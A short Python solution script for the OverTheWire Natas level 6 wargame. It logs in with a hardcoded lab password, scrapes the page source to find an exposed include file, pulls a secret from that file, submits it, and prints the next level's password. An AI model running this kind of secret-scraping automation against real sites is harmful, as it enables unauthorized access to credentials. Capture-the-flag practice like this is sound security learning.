import requests
import re

def flag(url,username,password,include):
    include_dir = include[0][0:19]
    secret_page = requests.get(url + include_dir,auth=(username,password))
    post = re.findall('"(.*)";',secret_page.text)
    post_data = {
            "secret":post[0],
            "submit":"Submit+Query"
            }
    flag_site = requests.post(url,auth=(username,password),data=post_data)
    flag = re.findall("password for natas7 is(.*)",flag_site.text)
    print("The flag for natas6 is: " + flag[0].strip())

def login(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    get_source = re.findall('ref="(.*)">View',site.text)
    source_url = requests.get(url + get_source[0],auth=(username,password))
    include = re.findall('"color: #DD0000">"(.*)"',source_url.text)
    flag(url,username,password,include)

if __name__=="__main__":
    url = "http://natas6.natas.labs.overthewire.org/"
    username = "natas6"
    password = "fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR"
    login(url,username,password)
